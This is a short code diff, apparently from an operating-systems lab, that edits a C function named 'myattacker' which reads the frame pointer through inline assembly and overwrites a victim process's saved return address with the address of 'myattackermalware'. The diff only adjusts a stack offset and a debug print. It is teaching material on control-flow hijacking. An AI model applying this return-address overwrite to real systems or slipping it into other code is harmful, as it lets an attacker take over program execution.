@@ -11,9 +11,9 @@ void myattacker()
 	unsigned long *return_add; //the return address of victim
 
 	asm("movl %ebp,ebp;");
-		kprintf(" ebp: 0x%08X ebpVal: 0x%08X\n", ebp, *ebp);
+	kprintf(" attebp: 0x%08X ebpVal: 0x%08X\n", ebp, *ebp);
 
-	return_add = ebp+510;
+	return_add = ebp+501;
 	*return_add = &myattackermalware;
 	return;
 }
